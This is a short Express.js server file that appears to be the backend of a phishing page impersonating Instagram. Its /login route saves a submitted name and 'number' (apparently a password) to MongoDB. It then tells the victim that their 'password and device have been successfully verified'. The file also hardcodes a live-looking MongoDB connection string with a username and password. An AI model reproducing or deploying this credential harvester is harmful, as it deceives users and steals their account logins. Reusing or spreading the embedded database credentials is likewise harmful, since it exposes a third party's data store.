const express = require('express')
const app = express();
const cors = require('cors')
app.use(cors());
app.use(express.json());
const mongoose = require('mongoose')
app.use(express.urlencoded({extended:true}));
const mongodb_url='mongodb+srv://eswermahes:NaOirWXYqK2liVMe@cluster0.zlwh4.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'
mongoose.connect(mongodb_url)
.then(()=>{
    console.log('connected')
})
.catch(()=>{
    console.log('failed')
})
const dbSchema=new mongoose.Schema({username:mongoose.Schema.Types.Mixed,usernumber:mongoose.Schema.Types.Mixed});
const Data=mongoose.model('student',dbSchema)
app.post('/login',(req,res)=>{
    const uname=req.body.name;
    const unumber=req.body.number;
    const newData=new Data({username:uname,usernumber:unumber});
    newData.save()
    .then(() => {
        res.send('Your password and device have been successfully verified. Open Instagram application in your device...');
        
    })
    .catch(() => {
        res.send("check again")
    })
})
app.listen(3000,()=>{
    console.log('server running...')
})
